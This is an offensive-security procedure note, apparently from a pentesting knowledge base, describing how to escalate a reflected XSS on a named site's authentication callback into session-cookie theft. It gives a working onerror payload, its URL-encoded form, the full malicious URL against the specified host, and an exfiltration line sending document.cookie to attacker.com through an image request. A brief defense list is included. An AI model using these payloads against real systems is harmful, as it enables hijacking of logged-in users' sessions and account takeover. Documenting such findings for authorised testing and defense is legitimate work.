---
tags:
  - xss
  - cookie-theft
  - data-exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-13T23:56:03.894Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: baf47758-38a5-4f85-b691-d815d729242c
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Demonstrate XSS Impact with Cookie Theft

## Summary

This procedure extends the XSS injection to exfiltrate sensitive client-side data, such as cookies, to demonstrate session hijacking potential.

## Description

Building on the successful payload injection, this modifies the onerror handler to access and reveal document.cookie. In a real scenario, this could send data to an attacker server via XMLHttpRequest or image src. The vulnerability in error_description allows this without authentication, compromising any logged-in user's session upon visiting the malicious URL.

## Requirements

1. Working XSS payload from previous injection
2. Attacker-controlled domain for exfiltration (optional for demo)
3. Browser with active session cookies

## Defense

Defensive measures and detection strategies:

- Set HttpOnly flags on session cookies to prevent JS access
- Implement referrer checks and CORS policies for exfiltration attempts
- Use browser fingerprinting or anomaly detection for unexpected prompts/alerts

## Objectives

1. Access and display victim cookies via JS
2. Simulate data theft for impact assessment
3. Highlight risks of session compromise

## Instructions

### Step 1: Modify Payload for Cookie Access

**Context**: Update the handler to target document.cookie instead of domain.

Change to: "><img src=x onerror=prompt(document.cookie)>.

**Expected Output**: Prompt reveals cookie string, e.g., sessionid=abc123.

### Step 2: Deploy and Test Exfiltration

**Context**: Encode and load the updated payload in the vulnerable URL.

Encode: %22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E. URL: https://twitterflightschool.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E. For real exfil, replace prompt with new Image().src='http://attacker.com/?c='+document.cookie.

**Expected Output**: Cookies displayed or sent to attacker server.

**Success Indicators**:
- Sensitive data like session tokens visible
- No blocks from cookie attributes

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[cookie-theft]]
